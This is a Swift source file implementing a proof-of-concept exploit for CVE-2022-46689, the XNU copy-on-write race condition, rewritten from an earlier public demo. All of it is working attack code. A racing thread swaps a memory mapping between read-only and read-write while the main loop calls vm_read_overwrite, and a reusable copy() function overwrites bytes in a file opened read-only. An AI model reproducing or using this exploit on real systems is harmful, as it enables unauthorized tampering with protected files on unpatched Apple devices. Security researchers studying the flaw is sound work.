//  sw1tch.swift
//  sw1tch
//
//  poc of CVE-2022-46689
//  this is a sorta rewrite of https://github.com/zhuowei/MacDirtyCowDemo but in swift
//
//  credits and thanks to:
//  zhuowei, Ian Beer, Apple, Project Zero
//
//  Created by staturnz @0x7FF7 on 1/5/23.
//
//

import Foundation
import Dispatch
import MachO


// yes i know this is not all of them
var kern_ret_str = ["KERN_SUCCESS","KERN_INVALID_ADDRESS","KERN_PROTECTION_FAILURE","KERN_NO_SPACE",
                    "KERN_INVALID_ARGUMENT","KERN_FAILURE","KERN_RESOURCE_SHORTAGE","KERN_NOT_RECEIVER",
                    "KERN_NO_ACCESS","KERN_MEMORY_FAILURE","KERN_MEMORY_ERROR","KERN_ALREADY_IN_SET",
                    "KERN_NOT_IN_SET","KERN_NAME_EXISTS","KERN_ABORTED","KERN_INVALID_NAME",
                    "KERN_INVALID_TASK", "KERN_INVALID_RIGHT"]


var obj_size: vm_size_t?
var addr: vm_address_t?
var ro_port: mach_port_t?
var rw_port: mach_port_t?
var ds: DispatchSemaphore?
var mtx = pthread_mutex_t()
var done: Bool?
var total_loops = 0


public func sw1tcheroo(pointer: UnsafeMutableRawPointer)  -> UnsafeMutableRawPointer? {
    var kernel_ret: kern_return_t
    ds?.signal()
    
    while (!done!) {
        pthread_mutex_lock(&mtx)
        if (done!) {
            pthread_mutex_unlock(&mtx)
            break;
        }
        
        // change addr over to RW mapping
        kernel_ret = vm_map(mach_task_self_, &(addr)!, obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, rw_port!, 0, boolean_t(0), VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT);
        print("[10] kr: \(kernel_ret), want 0")
        usleep(100)
        
        // change addr back to RO mapping
        kernel_ret = vm_map(mach_task_self_, &(addr)!, obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, ro_port!, 0, boolean_t(0), VM_PROT_READ, VM_PROT_READ, VM_INHERIT_DEFAULT);
        print("[11] kr: \(kernel_ret), want 0")
        
        // unlock thread to stop changing mapping
        pthread_mutex_unlock(&mtx)
        usleep(100)
    }
    return nil
}


public func log(str: String) {
    // send a NSNotification that is observed for logging into a textview and then prints as normal
    NotificationCenter.default.post(name: NSNotification.Name(rawValue: "log"), object: nil, userInfo: ["str":str])
    print(str)
}

public func copy(file_to_overwrite: CInt, file_offset: off_t, overwrite_data: UnsafeRawPointer, overwrite_length: size_t) -> Bool {
    
    print("1:  \(file_to_overwrite)")
    print("2:  \(file_offset)")
    print("3:  \(overwrite_data)")
    print("4:  \(overwrite_length)")
    
    log(str: "[*] starting sw1tch...")
    var retval = false
    var th: pthread_t? = nil
    var ret: Int
    var kernel_ret: kern_return_t
    var start: time_t
    var duration: time_t
    var copied_size: vm_size_t = 0
    var loops: Int
    var addr_e2: vm_address_t
    var addr_e5 = vm_address_t()
    var ro_addr: vm_address_t
    var tmp_addr: vm_address_t
    var mo_size: memory_object_size_t
    
    obj_size = 256 * 1024
    
    // map the file we want to overwrite in memory as read only with page-aligned addr
    let file_mapped = mmap(nil, 256 * 1024, PROT_READ, MAP_SHARED, file_to_overwrite, file_offset)
    if (file_mapped == MAP_FAILED) {
        log(str: "[*] failed to map file: MAP_FAILED")
    }
    log(str: "[*] file mapped into memory")

    // check if our target file we want to overwrite is already the same as what we are trying to replace it with
    if (memcmp(file_mapped, overwrite_data, overwrite_length) == 0) {
        log(str: "[*] file is already the same")
        munmap(file_mapped, Int(obj_size!));
        return true
    }

    // store our mapped file into ro_addr and set addr to 0
    ro_addr = vm_address_t(bitPattern: file_mapped);
    addr = 0
    
    // create our thread
    ds = DispatchSemaphore(value: 0)
    ret = Int(pthread_mutex_init(&(mtx), nil))
    if (ret != 0) {
        log(str: "[*] failed to initialize thread: \(ret)")
        return false;
    }
    
    // set our read-write and read-only ports to null
    done = false
    rw_port = mach_port_t(MACH_PORT_NULL)
    ro_port = mach_port_t(MACH_PORT_NULL)
    
    // set ro_addr (mapped file to overwrite) to read-only permissions with VM_PROT_READ flag
    kernel_ret = vm_protect(mach_task_self_, ro_addr, obj_size!, boolean_t(1), VM_PROT_READ);
    print("[1] kr: \(kernel_ret), want 0")
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[-] failed to set mapped file as RO: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] mapped file set to RO: \(kern_ret_str[Int(kernel_ret)])")
    
    // check that ro_addr was correctly protected as read-only by trying to get a read-write handle
    mo_size = memory_object_size_t(obj_size!)
    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(ro_addr), MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE, &(ro_port)!, mem_entry_name_port_t(MACH_PORT_NULL));
    if (kernel_ret != KERN_PROTECTION_FAILURE) {
        log(str: "[*] failed RW handle check: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] RW handle check: GOOD")

    // now that we know we cant get a read-write handle lets get a read-only one
    mo_size = memory_object_size_t(obj_size!)
    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(ro_addr), MAP_MEM_VM_SHARE | VM_PROT_READ, &(ro_port)!, mem_entry_name_port_t(MACH_PORT_NULL));
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to get RO handle: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] got RO handle of target: \(kern_ret_str[Int(kernel_ret)])")
    
    if(mo_size != memory_object_size_t(obj_size!)) {
        log(str: "[*] RW map check: FAILED")
    }
    log(str: "[*] RW map check: GOOD")

    // check that we cant map our read-only handle as read-write by trying to map it into tmp_addr, if we cant map as read-write we will expect KERN_INVALID_RIGHT
    tmp_addr = 0
    kernel_ret = vm_map(mach_task_self_, &tmp_addr, obj_size!, 0, VM_FLAGS_ANYWHERE, ro_port!, 0, boolean_t(0), VM_PROT_READ, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT)
    if (kernel_ret != KERN_INVALID_RIGHT) {
        log(str: "[*] failed RW handle check: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] RW handle check: GOOD")

    // try mapping with our max prot as read-write, we will expect KERN_INVALID_RIGHT for the return
    tmp_addr = 0
    kernel_ret = vm_map(mach_task_self_, &tmp_addr, obj_size!, 0, VM_FLAGS_ANYWHERE, ro_port!, 0, boolean_t(0), VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT)
    if (kernel_ret != KERN_INVALID_RIGHT) {
        log(str: "[*] failed RW handle check: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] RW handle check: GOOD")

    // allocate a buffer for the unaligned copy later
    kernel_ret = vm_allocate(mach_task_self_, &addr_e5, obj_size!, VM_FLAGS_ANYWHERE)
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to allocate buffer: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] allocated buffer for overwrite: \(kern_ret_str[Int(kernel_ret)])")

    tmp_addr = 0;
    kernel_ret = vm_allocate(mach_task_self_, &tmp_addr, obj_size!, VM_FLAGS_ANYWHERE)
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to allocate temp memory: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] allocated temp memory: \(kern_ret_str[Int(kernel_ret)])")

    // get handle for read-write
    mo_size = memory_object_size_t(obj_size!)
    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(tmp_addr), MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE, &(rw_port)!, mem_entry_name_port_t(MACH_PORT_NULL));
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to get of RW handle: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] got handle of RW memory: \(kern_ret_str[Int(kernel_ret)])")

    if (mo_size != memory_object_size_t(obj_size!)) {
        log(str: "[*] memory objects check: NOT EQUAL")
    }
    log(str: "[*] memory objects check: EQUAL")

    // deallocate our temp addr
    kernel_ret = vm_deallocate(mach_task_self_, tmp_addr, obj_size!);
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to decallocate temp addr: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] deallocated temp addr: \(kern_ret_str[Int(kernel_ret)])")

    // set our temp addr to 0 after deallocate and lock thread
    tmp_addr = 0;
    pthread_mutex_lock(&mtx);
    
    // start the racing thread at sw1tcheroo
    log(str: "[*] starting racing thread...")
    ret = Int(pthread_create(&th, nil, sw1tcheroo, nil))
    if (ret != 0) {
        log(str: "[*] failed to start racing thread")
    }
    log(str: "[*] racing thread started successfully")

    // wait for our racing thread to be ready
    ds?.wait()
    log(str: "[*] racing thread ready")

    duration = 10
    start = time(nil)
    loops = 0
    while time(nil) < start + duration {
        print("start: \(start)")
        print("start: \(duration)")

        log(str: "[*] current loop: \(loops)")
        loops += 1
        
        // reserve space for our allocations
        addr_e2 = 0
        kernel_ret = vm_allocate(mach_task_self_, &addr_e2, 2 * obj_size!, VM_FLAGS_ANYWHERE)
        if (kernel_ret != KERN_SUCCESS) {
            log(str: "[*] failed to reserve space: \(kern_ret_str[Int(kernel_ret)])")
        }
        log(str: "[*] space reserved for allocations: \(kern_ret_str[Int(kernel_ret)])")

        // make our 1st allocation
        kernel_ret = vm_allocate(mach_task_self_, &addr_e2, obj_size!, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE)
        if (kernel_ret != KERN_SUCCESS) {
            log(str: "[*] failed to allocate memory: \(kern_ret_str[Int(kernel_ret)])")
        }
        log(str: "[*] allocated memory: \(kern_ret_str[Int(kernel_ret)])")

        // map our targer to read-only
        addr = addr_e2 + obj_size!
        kernel_ret = vm_map(mach_task_self_, &(addr!), obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, ro_port!, 0, boolean_t(0), VM_PROT_READ, VM_PROT_READ, VM_INHERIT_DEFAULT)
        if (kernel_ret != KERN_SUCCESS) {
            log(str: "[*] failed to map RO target: \(kern_ret_str[Int(kernel_ret)])")
        }
        log(str: "[*] mapped RO target: \(kern_ret_str[Int(kernel_ret)])")

        // unlock our racing thread
        pthread_mutex_unlock(&mtx)
        log(str: "[*] unlocked thread")
        usleep(100)

        // the magic overwrite
        log(str: "[*] attempting overwrite now")
        kernel_ret = vm_read_overwrite(mach_task_self_, addr_e5, obj_size!, addr_e2 + UInt(overwrite_length), &copied_size);
        if (kernel_ret == KERN_SUCCESS) {
            if (loops > 50) {
                retval = true
                log(str: "[*] overwrite successful: \(kern_ret_str[Int(kernel_ret)])")
                break;
            }
        }
        log(str: "[*] trying again: \(kern_ret_str[Int(kernel_ret)])")

        // lock our racing thread
        pthread_mutex_lock(&mtx)
        log(str: "[*] locked thread")

        // clean up and loop again
        log(str: "[*] cleaning up and looping again")
        
        vm_deallocate(mach_task_self_, addr!, obj_size!)
        addr = 0
        vm_deallocate(mach_task_self_, addr_e2, obj_size!)
        addr_e2 = 0
    }
    
    // we overwrote the file, now we unlock our thread and deallocate everything
    done = true
    pthread_mutex_unlock(&mtx)
    log(str: "[*] unlocked thread")
    pthread_join(th!, nil)
    
    log(str: "[*] cleaning up...")
    kernel_ret = mach_port_deallocate(mach_task_self_, rw_port!)
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to deallocate RW port: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] deallocated RW port: \(kern_ret_str[Int(kernel_ret)])")

    kernel_ret = mach_port_deallocate(mach_task_self_, ro_port!)
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to deallocate RO port: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] deallocated RO port: \(kern_ret_str[Int(kernel_ret)])")

    kernel_ret = vm_deallocate(mach_task_self_, ro_addr, obj_size!)
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to deallocate RO addr: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] deallocated RO addr: \(kern_ret_str[Int(kernel_ret)])")

    kernel_ret = vm_deallocate(mach_task_self_, addr_e5, obj_size!)
    if (kernel_ret != KERN_SUCCESS) {
        log(str: "[*] failed to deallocate addr_e5: \(kern_ret_str[Int(kernel_ret)])")
    }
    log(str: "[*] deallocated addr_e5: \(kern_ret_str[Int(kernel_ret)])")

    // all done!
    log(str: "[*] sw1tch overwrite finished")
    log(str: "done")
    return retval
}

